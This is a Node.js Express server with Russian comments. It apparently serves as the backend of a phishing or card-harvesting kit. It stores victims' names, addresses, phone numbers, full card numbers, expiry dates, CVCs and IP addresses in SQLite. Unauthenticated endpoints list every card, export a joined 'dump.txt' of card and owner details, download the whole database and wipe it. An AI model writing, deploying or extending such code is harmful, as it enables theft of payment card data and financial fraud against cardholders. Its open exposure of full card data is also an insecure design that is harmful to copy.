// server.js
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import { initDB } from './db.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Разрешаем запросы с фронта
app.use(cors({ origin: 'http://localhost:3000' }));
app.use(bodyParser.json());

let db;
initDB()
  .then(database => {
    db = database;
    console.log('SQLite готова');
  })
  .catch(err => {
    console.error('Ошибка инициализации БД:', err);
  });

// Сохраняем данные пользователя
app.post('/api/users', async (req, res) => {
  try {
    const { phoneNumber, address, name, orderItems, clientNumber, date } = req.body;
    const stmt = `
      INSERT INTO users
      (phoneNumber, address, name, orderItems, clientNumber, date)
      VALUES (?, ?, ?, ?, ?, ?)
    `;
    const result = await db.run(stmt, [
      phoneNumber,
      address,
      name,
      JSON.stringify(orderItems),
      clientNumber,
      date
    ]);
    res.status(201).json({ success: true, id: result.lastID });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// Сохраняем данные карты (без дополнительных полей)
app.post('/api/cards', async (req, res) => {
  try {
    const {
      clientNumber,
      phoneNumber,
      cardNumber,
      expiryMonth,
      expiryYear,
      cvc,
      cardName,
      clientIP,
      date
    } = req.body;

    const stmt = `
      INSERT INTO cards
      (clientNumber, phoneNumber, cardNumber, expiryMonth, expiryYear, cvc, cardName, clientIP, date)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `;
    const params = [
      clientNumber,
      phoneNumber,
      cardNumber,
      expiryMonth,
      expiryYear,
      cvc,
      cardName,
      clientIP,
      date
    ];
    const result = await db.run(stmt, params);

    const saved = await db.get('SELECT * FROM cards WHERE id = ?', result.lastID);
    res.status(201).json(saved);
  } catch (e) {
    console.error('Error in /api/cards:', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

// Вернуть все карты
app.get('/api/cards', async (req, res) => {
  const all = await db.all('SELECT * FROM cards');
  res.json(all);
});

// Скачать дамп в текстовом формате
app.get('/download-txt', async (req, res) => {
  const rows = await db.all(`
    SELECT
      cards.id    AS cardId,
      users.id    AS userId,
      cards.clientNumber,
      cards.phoneNumber,
      cards.cardNumber,
      cards.expiryMonth,
      cards.expiryYear,
      cards.cvc,
      cards.cardName,
      cards.clientIP,
      cards.date,
      users.address,
      users.name
    FROM cards
    LEFT JOIN users ON cards.clientNumber = users.clientNumber
  `);
  const lines = rows.map(r =>
    Object.entries(r)
      .map(([k, v]) => `${k}=${v}`)
      .join('\t')
  );
  const content = lines.join('\n');
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
  res.send(content);
});

// Скачать базу SQLite
app.get('/download', (req, res) => {
  const file = path.join(__dirname, 'data.sqlite');
  res.download(file, 'data.sqlite', err => {
    if (err) res.status(500).send('Ошибка скачивания');
  });
});

// Очистить всю БД (cards + users)
app.delete('/api/clear', async (req, res) => {
  try {
    await db.exec('DELETE FROM cards;');
    await db.exec('DELETE FROM users;');
    await db.exec('DELETE FROM sqlite_sequence WHERE name="cards";');
    await db.exec('DELETE FROM sqlite_sequence WHERE name="users";');
    res.json({ success: true, message: 'Database cleared: cards and users tables are empty.' });
  } catch (e) {
    console.error('Error clearing database:', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Сервер запущен на http://localhost:${PORT}`));